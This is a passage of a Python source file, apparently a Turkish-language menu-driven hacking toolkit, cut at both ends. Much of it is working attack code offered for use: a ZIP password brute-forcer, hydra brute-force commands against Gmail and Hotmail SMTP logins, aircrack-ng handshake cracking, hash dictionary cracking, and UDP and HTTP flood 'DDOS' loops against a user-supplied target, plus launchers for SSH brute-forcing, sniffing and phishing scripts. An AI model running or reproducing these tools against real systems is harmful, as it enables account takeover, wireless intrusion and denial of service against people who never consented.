|   '.'.____.'.'   | 
'.____'.____.'____.' 2-) Wordlistim yok
'.________________.'


		''')
		aaaas = input("Seç > ")

		if(aaaas=="2"):
			import random 
			import pyzipper
			import os
			os.system("pip install pyzipper")
		
			chars = input("İçinde olmasını istediğiniz harf rakam sembol vb giriniz: ")

			password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
			password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(0,password_uzunluk):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				#print(password)
				passworda = (password+"\n")
				dosya = open("wlist.txt","a")
				dosya.write(passworda)


			wordlist = ("wlist.txt")

			file = input("Zip dosya yolunu belirtiniz > ")	
			icdosya = input("Zip dosyası içinden herhangi bi dosya adı+uzantı giriniz > ")
	
			fileobject = pyzipper.AESZipFile(file)

			with open(wordlist,"rb") as wordlist:
				for word in wordlist:
					try:
						fileobject.pwd = word.strip()
						fileobject.read(icdosya)
					except:
						print("\033[93mŞifre denendi = ",word.decode().strip())
						continue
					else:
						print("\033[92mŞifre bulundu! İşte şifre = ",word.decode().strip())
						os.system("rm -rf wlist.txt")
						exit(0)
				
			os.system("rm -rf wlist.txt")
			print("\033[91mŞifre Bulunamadı")

		elif(aaaas=="1"):
			import pyzipper
			import os
			os.system("pip install pyzipper")
			wordlist = input("Wordlist Yolunu Belirtiniz > ")

			file = input("Zip dosya yolunu belirtiniz > ")	
			icdosya = input("Zip dosyası içinden herhangi bi dosya adı+uzantı giriniz > ")

			fileobject = pyzipper.AESZipFile(file)

			with open(wordlist,"rb") as wordlist:
				for word in wordlist:
					try:
						fileobject.pwd = word.strip()
						fileobject.read(icdosya)
					except:
						print("\033[93mŞifre denendi = ",word.decode().strip())
						continue
					else:
						print("\033[92mŞifre bulundu! İşte şifre = ",word.decode().strip())
						exit(0)
			print("\033[91mŞifre Bulunamadı")


	elif(yeraltisecim=="16"):
		import random 
		import os
		chars = input("İçinde olmasını istediğiniz harf rakam sembol vb giriniz: ")	
		password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
		password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
		for x in range(0,password_sayi):
			password = ""
			for x in range(0,password_uzunluk):
				password_sayi = random.choice(chars)
				password	= password + password_sayi
			passworda = (password+"\n")
			dosya = open("sxwlist.txt","a")
			dosya.write(passworda)

	elif(yeraltisecim=="17"):
		os.system("python3 oltalama/openserver.py")


	elif(yeraltisecim=="18"):
		os.system("clear")
		os.system("python3 instabot.py")


	elif(yeraltisecim=="19"):
		import requests
		from bs4 import BeautifulSoup
		header_kod = { 'User-Agent' : 'Mozilla/5.0 (Machintosh; Sexettin X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecho) Sexettin/48.0.2564.116 Naber/537.36'}
		print("Örnek site: https://google.com  http/https eklemeyi unutmayın")
		hedefsite = input("Hedef Url Giriniz: ")
		hedefl = requests.get(hedefsite,headers=header_kod)
		hedefg = hedefl.content
		guzelcorba = BeautifulSoup(hedefg,"html.parser")
		for i in guzelcorba.find_all("a"):
    			print(i)
    			print("\n ################################################################ \n")

	elif(yeraltisecim=="20"):
		import requests
		from bs4 import BeautifulSoup
		header_kod = { 'User-Agent' : 'Mozilla/5.0 (Machintosh; Sexettin X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecho) Sexettin/48.0.2564.116 Naber/537.36'}
		print("Örnek site: https://google.com  http/https eklemeyi unutmayın")
		hedefsite = input("Hedef Url Giriniz: ")
		hedefl = requests.get(hedefsite,headers=header_kod)
		hedefg = hedefl.content
		guzelcorba = BeautifulSoup(hedefg,"html.parser")
		for i in guzelcorba.find_all("html" and "p"):
    			print(i)
    			print("\n ################################################################ \n")


#kodları beğendin mi :)

	elif(yeraltisecim=="21"):
		import requests
		from bs4 import BeautifulSoup
		header_kod = { 'User-Agent' : 'Mozilla/5.0 (Machintosh; Sexettin X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecho) Sexettin/48.0.2564.116 Naber/537.36'}
		print("Örnek site: https://google.com  http/https eklemeyi unutmayın")
		hedefsite = input("Hedef Url Giriniz: ")
		hedefl = requests.get(hedefsite,headers=header_kod)
		hedefg = hedefl.content
		guzelcorba = BeautifulSoup(hedefg,"html.parser")
		for i in guzelcorba.find_all("img"):
    			print(i)
    			print("\n ################################################################ \n")



	elif(yeraltisecim=="22"):
		ilkd = input("İlk dosyanın adresini giriniz: ")
		sond = input("Son dosyanın adresini giriniz: ")
		ilkv = open(ilkd)
		sonv = open(sond)
		ilk = str(ilkv.read())
		son = str(sonv.read())
		if(ilk==son):
			print("\033[92mEşleşme Başarılı")
		else:
			print("\033[91mEşleşme Başarısız")
			
	elif(yeraltisecim=="23"):
		import os
		print(''' 
		\33[92m
		  ad8888888888ba
		 dP'         `"8b, 
		 8  ,aaa,       "Y888a     ,aaaa,     ,aaa,  ,aa,
		 8  8'd`8           "88baadP""""YbaaadP"""YbdP""Yb
		 8  8 t 8              """        """      ""    8b
		 8  8,0,8         ,aaaaaaaaaaaaaaaaaaaaaaaaddddd88P
		 8  `"""'       ,d8""     0-Ana Menü
		 Yb,         ,ad8"        1-Şifrele
		  "Y8888888888P"	  2-Şifreyi Çöz
		''')
		secim = input("Seçiminizi yapınız > ")
		if(secim=="0"):
			os.system("python3 sexettintoolsv"+surum+".py")
			
		if(secim=="1"):
			dosyayolu = input("Dosya Yolunu Belirtiniz > ")
			yazilar = open(dosyayolu)
			veri = yazilar.read()
			veri19 = veri.replace("print","5Fg%FaD8++")
	
			veri1 = veri19.replace("import os","^^#294^ert%+'1")
			veri2 = veri1.replace("import socket","+'^'!trweS1a54")
			veri3 = veri2.replace("random.choice","m+^!lkdw%A")
			veri4 = veri3.replace("import random","l(Ed+S'wa^'")
			veri5 = veri4.replace("elif(","%+^i+se/e}0y!ou+^!")
			veri6 = veri5.replace("def","%&dagbfaFFFsaw")
			veri7 = veri6.replace("class","GAGF53DA221")
			veri8 = veri7.replace("else","242BGAD32FEF53")
			veri9 = veri8.replace("import urllib.request","7E6Q-dw!aY^o'")
			veri10 = veri9.replace("input(","1F'dA4^12&")
			veri11 = veri10.replace("float","92324232213")
			veri12 = veri11.replace("os.system","&&76fr}R5")
			veri13 = veri12.replace("import time","\gwalj//2CxZ")
			veri14 = veri13.replace("import requests","*1)92DfH/c")
			veri15 = veri14.replace("except","}23!ERtdaBFV")
			veri16 = veri15.replace("time.sleep","{da^2sda'^da^")
			veri17 = veri16.replace("while True:","-2'!3gf+51")
			veri18 = veri17.replace("for i in range","yU32kL:q")
			veri20 = veri18.replace("<html>","DWM32D3S&%DW")
			veri21 = veri20.replace("</html>","ODW+'2GH")
			veri22 = veri21.replace("<meta","KFE21{ad4")
			veri23 = veri22.replace("<title>","dwm36Uwda")
			veri24 = veri23.replace("</title>","D_DW]D^17W")
			veri25 = veri24.replace("<head>","KD{W/A+Mdw")
			veri26 = veri25.replace("<body>","5232fagw+da'^")
			veri27 = veri26.replace("</body>","LDW21f42nw")
			veri28 = veri27.replace("<p>","GAF32PDW+DLW")
			veri29 = veri28.replace("</p>","K90E2FADW")
			veri30 = veri29.replace("<?php","MDW^AD6TY")
			veri31 = veri30.replace("?>","JDK3dw^1wd")
			veri32 = veri31.replace("<script>","GFA^4dwA")
			veri33 = veri32.replace("</script>","42B24DJ21F")
			veri34 = veri33.replace("<table>","ld-a'L+DA")
			veri35 = veri34.replace("</table>","Kdwa%32VV")
			veri36 = veri35.replace("<div","kLDA^rBaE")
			veri37 = veri36.replace("</div","4$da32^fa")
			veri38 = veri37.replace("<br>","Lda^!ws'")
			veri39 = veri38.replace("<a href","lfDAw22ES+'1")
			veri40 = veri39.replace("</head>","2DfFAFa+3D")

			yazilarson = open("encsuccess.txt","w+")
			yazilarson.write(veri40)
			print("Başarılı, dosya bulunduğunuz dizine oluşturuldu")

		if(secim=="2"):
			dosyayolu = input("Dosya Yolunu Belirtiniz > ")
			yazilar = open(dosyayolu)
			veri = yazilar.read()
			veri19 = veri.replace("5Fg%FaD8++","print")
	
			veri1 = veri19.replace("^^#294^ert%+'1","import os")
			veri2 = veri1.replace("+'^'!trweS1a54","import socket")
			veri3 = veri2.replace("m+^!lkdw%A","random.choice")
			veri4 = veri3.replace("l(Ed+S'wa^'","import random")
			veri5 = veri4.replace("%+^i+se/e}0y!ou+^!","elif(")
			veri6 = veri5.replace("%&dagbfaFFFsaw","def")
			veri7 = veri6.replace("GAGF53DA221","class")
			veri8 = veri7.replace("242BGAD32FEF53","else")
			veri9 = veri8.replace("7E6Q-dw!aY^o'","import urllib.request")
			veri10 = veri9.replace("1F'dA4^12&","input(")
			veri11 = veri10.replace("92324232213","float")
			veri12 = veri11.replace("&&76fr}R5","os.system")
			veri13 = veri12.replace("\gwalj//2CxZ","import time")
			veri14 = veri13.replace("*1)92DfH/c","import requests")
			veri15 = veri14.replace("}23!ERtdaBFV","except")
			veri16 = veri15.replace("{da^2sda'^da^","time.sleep")
			veri17 = veri16.replace("-2'!3gf+51","while True:")
			veri18 = veri17.replace("yU32kL:q","for i in range")
			veri20 = veri18.replace("DWM32D3S&%DW","<html>")
			veri21 = veri20.replace("ODW+'2GH","</html>")
			veri22 = veri21.replace("KFE21{ad4","<meta")
			veri23 = veri22.replace("dwm36Uwda","<title>")
			veri24 = veri23.replace("D_DW]D^17W","</title>")
			veri25 = veri24.replace("KD{W/A+Mdw","<head>")
			veri26 = veri25.replace("5232fagw+da'^","<body>")
			veri27 = veri26.replace("LDW21f42nw","</body>")
			veri28 = veri27.replace("GAF32PDW+DLW","<p>")
			veri29 = veri28.replace("K90E2FADW","</p>")
			veri30 = veri29.replace("MDW^AD6TY","<?php")
			veri31 = veri30.replace("JDK3dw^1wd","?>")
			veri32 = veri31.replace("GFA^4dwA","<script>")
			veri33 = veri32.replace("42B24DJ21F","</script>")
			veri34 = veri33.replace("ld-a'L+DA","<table>")
			veri35 = veri34.replace("Kdwa%32VV","</table>")
			veri36 = veri35.replace("kLDA^rBaE","<div")
			veri37 = veri36.replace("4$da32^fa","</div>")
			veri38 = veri37.replace("Lda^!ws'","<br>")
			veri39 = veri38.replace("lfDAw22ES+'1","<a href")
			veri40 = veri39.replace("2DfFAFa+3D","</head>")

			yazilarson = open("decsuccess.txt","w+")
			yazilarson.write(veri40)
			print("Başarılı, dosya bulunduğunuz dizine oluşturuldu")


	elif(yeraltisecim == "24"):
		print("""
1-) Dosyada kelimeyi içeren tüm satırları listele
2-) Dosyada kelimeyi içeren tüm satırları ve bu satırların satır numaralarını listele
3-) Büyük/küçük harf duyarsız olarak dosyada kelimeyi içeren tüm satırları listele""")
		dosyaislemleri = input("Seçiminizi giriniz: ")
		kelime = input("Hedef kelimeyi giriniz: ")
		dosya = input("Arama yapılacak dosya yolu giriniz: ")
		if dosyaislemleri == "1":
			try:
				with open(dosya, 'r', encoding='utf-8') as f:
					for satir in f:
						if kelime in satir:
							print(satir, end='')
			except FileNotFoundError:
				print(f"Dosya bulunamadı: {dosya}")
			except Exception as e:
				print(f"Bir hata oluştu: {e}")

		elif dosyaislemleri == "2":
			try:
				with open(dosya, 'r', encoding='utf-8') as f:
					for numara, satir in enumerate(f, start=1):
						if kelime in satir:
							print(f"{numara}: {satir}", end='')
			except FileNotFoundError:
				print(f"Dosya bulunamadı: {dosya}")
			except Exception as e:
				print(f"Bir hata oluştu: {e}")
		elif dosyaislemleri == "3":
			try:
				with open(dosya, 'r', encoding='utf-8') as f:
					for satir in f:
						if kelime.lower() in satir.lower():
							print(satir, end='')
			except FileNotFoundError:
				print(f"Dosya bulunamadı: {dosya}")
			except Exception as e:
				print(f"Bir hata oluştu: {e}")
		else:
			print("Geçersiz seçim")


	elif(yeraltisecim=="25"):
		import requests
		import time
		def dosya_var_mi(url):
			try:
				response = requests.get(url)
				if response.status_code == 200:
					print(f"{url} mevcut!")
					return True
				else:
					print(f"{url} bulunamadı (Status Code: {response.status_code})")
					return False
			except requests.exceptions.RequestException as e:
				print(f"Bir hata oluştu: {e}")
				return False

		def listeden_url_kontrol(list_dosyasi, ana_url, bekleme_suresi):
			try:
				with open(list_dosyasi, 'r') as file:
					dosyalar = file.readlines()
        
				for dosya in dosyalar:
					dosya = dosya.strip()  
					tam_url = f"{ana_url}/{dosya}"
					dosya_var_mi(tam_url)
					time.sleep(bekleme_suresi) 

			except FileNotFoundError:
				print(f"{list_dosyasi} dosyası bulunamadı.")
			except Exception as e:
				print(f"Bir hata oluştu: {e}")

		ana_url = input("Kontrol etmek istediğiniz URL'yi (https://site.com gibi) giriniz: ")
		print("Not: Bekleme süresini arttırmak daha düzgün tarama yapmanızı sağlar. Bunun yanında işlem süresi uzar. İdeal işlem süresi 5-7'dir")
		bekleme_suresi = int(input("Her kontrol arasında bekleme süresi (saniye cinsinden) girin: "))
		print("İsterseniz hazır wordlisti de kullanabilirsiniz. Bunun için wordlist giriş kısmına admin_list.txt yazınız.")
		print("Buradaki hazır wordlisti https://github.com/alienwhatever/Admin-Scanner/blob/master/list.txt adresinden aldım.")
		list_dosyasi = input("Wordlist dosyası giriniz: ")
		listeden_url_kontrol(list_dosyasi, ana_url, bekleme_suresi)



	elif(yeraltisecim=="26"):
		print("""Hangi servis üzerinde işlem yapmak isterseniz o servise bağlı numarayı giriniz.
Seçenekler:
1 - Tinyurl
2 - isgd""")
		linksecim = int(input("Seçiminiz (1-2): "))
		import requests
		if linksecim==2:
			uzun_url = input("Kısaltılacak URL adresini giriniz: ")
			response = requests.get(f"http://is.gd/create.php?format=simple&url={uzun_url}")
			print("Kısaltılmış URL adresi:")
			print(response.text)

		elif linksecim==1:
			api_url = 'http://tinyurl.com/api-create.php?url='
			uzun_url = input("Kısaltılacak url adresini giriniz:")
			response = requests.get(api_url+uzun_url)
			print("Kısaltılmış url adresi:")
			print(response.text)

		else:
			print("Yalnızca 1 ve 2 seçenekleri mevcuttur.")


	elif(yeraltisecim=="27"):
		import requests
		print("Domain girerken https veya da www yazmayın. Yalnızca google.com şeklinde yazınız.")
		domain = input("WHOIS bilgilerini almak istediğiniz domaini giriniz: ")
		response = requests.get(f"https://rdap.org/domain/{domain}")
		whois_info = response.json()
		print(f"{domain} için WHOIS bilgileri:")
		print(whois_info)


	elif(yeraltisecim=="28"):
		import requests
		print("Domain girerken https veya da www yazmayın. Yalnızca google.com şeklinde yazınız.")
		domain = input("SSL analizini yapmak istediğiniz domaini giriniz: ")
		response = requests.get(f"https://api.ssllabs.com/api/v3/analyze?host={domain}")
		ssl_info = response.json()
		print(f"{domain} için SSL/TLS bilgileri:")
		print(ssl_info)

	elif(yeraltisecim=="29"):
		import requests
		response = requests.get("https://randomuser.me/api/")
		user = response.json()
		print("Rastgele kullanıcı:")
		print(f"İsim: {user['results'][0]['name']['first']} {user['results'][0]['name']['last']}")
		print(f"E-posta: {user['results'][0]['email']}")
		print(f"Ülke: {user['results'][0]['location']['country']}")

	elif(yeraltisecim=="30"):
		import requests
		print("Bu program sizin için sahte gönderi başlığı oluşturur. Farklı dillerde sonuç alabilirsiniz.")
		response = requests.get("https://jsonplaceholder.typicode.com/posts")
		posts = response.json()
		gonderi_sayi = int(input("Kaç gönderi görmek istiyorsunuz:"))
		print("İlk",gonderi_sayi,"gönderi:")
		for post in posts[:gonderi_sayi]:
			print(f"ID: {post['id']}, Başlık: {post['title']}")

	elif(yeraltisecim=="31"):
		import requests
		domain = input("DNS bilgilerini almak istediğiniz domaini giriniz: ")
		response = requests.get(f"https://dns.google/resolve?name={domain}")
		dns_info = response.json()
		print(f"{domain} için DNS bilgileri:")
		for answer in dns_info.get('Answer', []):
			print(answer)

	elif(yeraltisecim=="32"):
		import requests
		isbn = input("ISBN numarasını giriniz: ")
		response = requests.get(f"https://openlibrary.org/api/books?bibkeys=ISBN:{isbn}&format=json&jscmd=data")
		kitap = response.json()
		print(f"Kitap Bilgisi: {kitap}")

	elif(yeraltisecim=="33"):
		import requests
		print("Bu sistem 2 yönlü api testi yapmaktadır. 2 seçeneği de deneyebilirsiniz. Bir seçenek hata verirse diğer seçeneğe geçiniz.")
		mailltestsecim = input("1 veya 2 yazınız. Hata alırsanız diğer seçeneği deneyiniz:")
		email = input("Doğrulamak istediğiniz e-posta adresini giriniz: ")
		if mailltestsecim=="1":
			response = requests.get(f"https://api.eva.pingutil.com/email?email={email}")
			email_info = response.json()
			print(f"Geçerli mi?: {email_info['data']['deliverable']}")
		elif mailltestsecim=="2":
			print("Mail dinleniyor...")
			os.system(f"""curl "https://api.eva.pingutil.com/email?email={email}" | json_pp""")
		else:
			print("Yanlış tuşladınız")

	elif(yeraltisecim=="34"):
		import requests
		ip = input("Analiz etmek istediğiniz IP adresini girin: ")
		response = requests.get(f"https://api.greynoise.io/v3/community/{ip}")
		ip_data = response.json()
		if ip_data.get("noise") == "true":
			print(f"{ip} bir zararlı faaliyete sahip.")
		else:
			print(f"{ip} güvenli görünüyor.")
		

	elif(yeraltisecim=="35"):
		os.system("python3 kits/sshbrute.py")

	elif(yeraltisecim=="36"):
		os.system("python3 kits/port-scanner-ip.py")

	elif(yeraltisecim=="37"):
		os.system("python3 kits/anormal-dns-tespit.py")

	elif(yeraltisecim=="38"):
		os.system("python3 kits/dns-yonlendirici.py")

	elif(yeraltisecim=="39"):
		os.system("python3 kits/sniff.py")

	elif(yeraltisecim=="40"):
		os.system("python3 kits/sniff2.py")



	elif(yeraltisecim=="41"):
		os.system("python3 sexettintoolsv"+surum+".py")
	else:
		print("Hatalı seçim, doğru seçeneği girdiğinizden emin olunuz")


elif(sexettinsecim=="16"):
	os.system("figlet Sexettin")
	print('''

1-) Email 

2-) Hotmail


''')
	brutev = input("Hangisini Seçiyorsun? ")
	if(brutev=="1"):
		email = input("Hedef Email: ")
		sifre = input("Şifre Dosyası : ")
		os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, sifre))


	elif(brutev=="2"):
		email = input("Hotmail : ")
		word = input("Şifre Dosyası : ")
		os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))


elif(sexettinsecim=="17"):
	import hashlib
	import argparse	
	sifreleyici = hashlib.md5()
	sifre2 = hashlib.sha1()
	sifre3 = hashlib.sha224()
	sifre4 = hashlib.sha256()
	sifre5 = hashlib.sha384()
	sifre6 = hashlib.sha512()
	sifre7 = hashlib.blake2b()
	metin = input("Metin Giriniz > ")
	sifreleyici.update(metin.encode("utf-8"))
	sifre2.update(metin.encode("utf-8"))
	sifre3.update(metin.encode("utf-8"))
	sifre4.update(metin.encode("utf-8"))
	sifre5.update(metin.encode("utf-8"))
	sifre6.update(metin.encode("utf-8"))
	sifre7.update(metin.encode("utf-8"))
	cikti = sifreleyici.hexdigest()
	cikti2 = sifre2.hexdigest()
	cikti3= sifre3.hexdigest()
	cikti4 = sifre4.hexdigest()
	cikti5 = sifre5.hexdigest()
	cikti6 = sifre6.hexdigest()
	cikti7 = sifre7.hexdigest()
	print(" ")
	print("MD5 > %s" % cikti)
	print(" ")
	print("SHA1 > %s" % cikti2)
	print(" ")
	print("SHA224 > %s" % cikti3)
	print(" ")
	print("SHA256 > %s" % cikti4)
	print(" ")
	print("SHA384 > %s" % cikti5)
	print(" ")
	print("SHA512 > %s" % cikti6)
	print(" ")
	print("BLAKE2b > %s" % cikti7)
	print(" ")



elif(sexettinsecim=="18"):
	os.system("clear")
	print("\033[91m")
	os.system("figlet Sexettin DDOS")
	print('''
                              ______________                               
                        ,===:'.,            `-._                           
                             `:.`---.__         `-._                       
                               `:.     `--.         `.                     
                                 \.        `.         `.                   
                         (,,(,    \.         `.   ____,-`.,                
                      (,'     `/   \.   ,--.___`.'                         
                  ,  ,'  ,--.  `,   \.;'         `                         
                   `{D, {    \  :    \;                                    
                     V,,'    /  /    //                                    
                     j;;    /  ,' ,-//.    ,---.      ,                    
                     \;'   /  ,' /  _  \  /  _  \   ,'/                    
                           \   `'  / \  `'  / \  `.' /                     
                            `.___,'   `.__,'   `.__,'  


Uyarı! güç arttırıldıkça cihazınız ve modeminiz işlem sırasında daha fazla yavaşlayacaktır.
Gücü arttırmanız önerilmez!
Araç içerisinde yaptığınız ve yapacağınız tüm şeylerden siz sorumlusunuz!

Seçenekler:
1500 byte = 1
5000 byte = 2
10000 byte = 3
20000 byte = 4
30000 byte = 5
40000 byte = 6 (ultra mod)
Profesyonel ddos = 7 (tam çalışmayabilir veya zararlı olabilir)
Sx-ddos = 8 (özel ddos saldırısı)
Ping saldırısı = 9
Ana menüye dön = 10
	''')
	ddos = input("Seçiminizi Yapınız > ")
	if(ddos=="1"):
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(1500)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

	elif(ddos=="2"):
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(5000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

	elif(ddos=="3"):
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(10000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

	elif(ddos=="4"):
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(20000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

	elif(ddos=="5"):
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(30000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))


	elif(ddos=="6"):
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(40000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

	elif(ddos=="7"):
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(25000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			dos = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos2 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos3 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos4 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos5 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos6 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos7 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos8 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos9 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos10 = sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))
		t1 = threading.Thread(target=dos)
		t2 = threading.Thread(target=dos2)
		t3 = threading.Thread(target=dos3)
		t4 = threading.Thread(target=dos4)
		t5 = threading.Thread(target=dos5)
		t6 = threading.Thread(target=dos6)
		t7 = threading.Thread(target=dos7)
		t8 = threading.Thread(target=dos8)
		t9 = threading.Thread(target=dos9)
		t10 = threading.Thread(target=dos10)
		t1.start()
		t2.start()
		t3.start()
		t4.start()
		t5.start()
		t6.start()
		t7.start()
		t8.start()
		t9.start()
		t10.start()
	elif ddos == "8":
		import time, requests
		site_ddos2 = input("Url adresini giriniz: ")
		print("Bekleme süresini ne kadar düşürürseniz o kadar hızlı saldırı yapar. İdeal tutmaya çalışın. İdeal: 0.5")
		bekleme_ddos2 = float(input("Bekleme süresini giriniz:"))
		saldirisayac = 0
		print("BU ARAÇTA YAPTIĞINIZ VE YAPACAĞINIZ HER ŞEYDEN SİZ SORUMLUSUNUZ!")
		print("SALDIRIYI DURDURMAK İÇİN CTRL C TUŞ KOMBİNASYONUNA ART ARDA BASINIZ")
		print("SALDIRI 5 SANİYE İÇİNDE BAŞLAYACAK")
		time.sleep(5)
		while True:
			reqddos2 = requests.get(site_ddos2)
			saldirisayac = saldirisayac+1
			print(f"Saldırı {saldirisayac}: {reqddos2.status_code}")
			time.sleep(bekleme_ddos2)

	elif ddos== "9":
		import os, time
		print("Saldırıyı durdurmak için art arda ctrl c tuşlarına basınız. Her şeyden siz sorumlusunuz.")
		print("Domain girerken https veya da www eklemeyiniz.")
		site_ddos_ping = input("Domain giriniz: ")
		bekleme_ping = float(input("İşlemler arası bekleme süresini giriniz:"))
		while True:
			os.system(f"ping {site_ddos_ping}")
			time.sleep(bekleme_ping)


	elif(ddos=="10"):
		os.system("python3 sexettintoolsv"+surum+".py")
	else:
		print("\nSadece gösterilen sayılardan gireceksin")


elif(sexettinsecim=="19"):
	print("Site adresini https://google.com şeklinde giriniz")
	site_adresi = input("Site adresini giriniz > ")
	kayityeri_19 = input("Kaynak kodunun kaydedileceği dosya ismini yazınız:")
	html = urllib.request.urlopen(site_adresi)
	htmlread = html.read()
	print(htmlread)
	kayityeri_19_dosya = open(kayityeri_19, "a+")
	html_str = htmlread.decode('utf-8')
	kayityeri_19_dosya.write(str(html_str))
	kayityeri_19_dosya.close()
	print("\n\nSİTE KODLARI YUKARIDA\n")
	print("Site kodları ", kayityeri_19, "dosyasına kayıt edildi.")


elif(sexettinsecim=="20"):
	os.system("python3 iss.py")

elif(sexettinsecim=="21"):
	os.system("apt-get install aircrack-ng")
	os.system("clear")
	os.system("figlet Handshake Decrypter")
	print('''

Hoş Geldiniz
	''')
	islemloop = True
	while islemloop:
		islemno = input("Handshake dosyasını belirtiniz: ")
		if islemno=="":
			print("Dizin bulunamadı, tekrar deneyiniz")
		else:
			islemloop = False
		wkonum = input("Wordlist konumunu belirtiniz: ")
	os.system("aircrack-ng "+islemno+" -w "+wkonum)
	

elif(sexettinsecim=="22"):
	print('''Şifre Çözme Programına Hoş Geldiniz
Seçenekler:
1- md5
2- sha1
3- sha224
4- sha256
5- sha384
6- sha512
7- blake2b''')
	tersine_sifre_secim = int(input("Hangi türde veri girecekseniz o veriye ait numara giriniz (1-7): "))
	wlist = input("Wordlist adını ve uzantısını giriniz: ")
	hcrack = input("Şifrelenmiş veriyi giriniz: ")
	if tersine_sifre_secim == 1:
		wlistlines = open(wlist,"r").readlines()
		for i in range(0,len(wlistlines)):
			hash2comp = hashlib.md5(wlistlines[i].replace("\n","").encode()).hexdigest()
			if hcrack == hash2comp:
				print("Bulundu! Şifre : "+wlistlines[i].replace("\n",""))
				exit()
		print("Wordlist içindeki tüm veriler denetlendi fakat bulunamadı")
	elif tersine_sifre_secim == 2:
		wlistlines = open(wlist,"r").readlines()
		for i in range(0,len(wlistlines)):
			hash2comp = hashlib.sha1(wlistlines[i].replace("\n","").encode()).hexdigest()
			if hcrack == hash2comp:
				print("Bulundu! Şifre : "+wlistlines[i].replace("\n",""))
				exit()
		print("Wordlist içindeki tüm veriler denetlendi fakat bulunamadı")
	elif tersine_sifre_secim == 3:
		wlistlines = open(wlist,"r").readlines()
		for i in range(0,len(wlistlines)):
			hash2comp = hashlib.sha224(wlistlines[i].replace("\n","").encode()).hexdigest()
			if hcrack == hash2comp:
				print("Bulundu! Şifre : "+wlistlines[i].replace("\n",""))
				exit()
		print("Wordlist içindeki tüm veriler denetlendi fakat bulunamadı")
	elif tersine_sifre_secim == 4:
		wlistlines = open(wlist,"r").readlines()
		for i in range(0,len(wlistlines)):
			hash2comp = hashlib.sha256(wlistlines[i].replace("\n","").encode()).hexdigest()
			if hcrack == hash2comp:
				print("Bulundu! Şifre : "+wlistlines[i].replace("\n",""))
				exit()
		print("Wordlist içindeki tüm veriler denetlendi fakat bulunamadı")
	elif tersine_sifre_secim == 5:
		wlistlines = open(wlist,"r").readlines()
		for i in range(0,len(wlistlines)):
			hash2comp = hashlib.sha384(wlistlines[i].replace("\n","").encode()).hexdigest()
			if hcrack == hash2comp:
				print("Bulundu! Şifre : "+wlistlines[i].replace("\n",""))
				exit()
		print("Wordlist içindeki tüm veriler denetlendi fakat bulunamadı")
	elif tersine_sifre_secim == 6:
		wlistlines = open(wlist,"r").readlines()
		for i in range(0,len(wlistlines)):
			hash2comp = hashlib.sha512(wlistlines[i].replace("\n","").encode()).hexdigest()
			if hcrack == hash2comp:
				print("Bulundu! Şifre : "+wlistlines[i].replace("\n",""))
				exit()
		print("Wordlist içindeki tüm veriler denetlendi fakat bulunamadı")
	elif tersine_sifre_secim == 7:
		wlistlines = open(wlist,"r").readlines()
		for i in range(0,len(wlistlines)):
			hash2comp = hashlib.blake2b(wlistlines[i].replace("\n","").encode()).hexdigest()
			if hcrack == hash2comp:
				print("Bulundu! Şifre : "+wlistlines[i].replace("\n",""))
				exit()
		print("Wordlist içindeki tüm veriler denetlendi fakat bulunamadı")
	else:
		print("Yalnızca belirtilen numaralardan birini giriniz.")

elif(sexettinsecim=="23"):
	import requests, time
	os.system("figlet Sexettin")
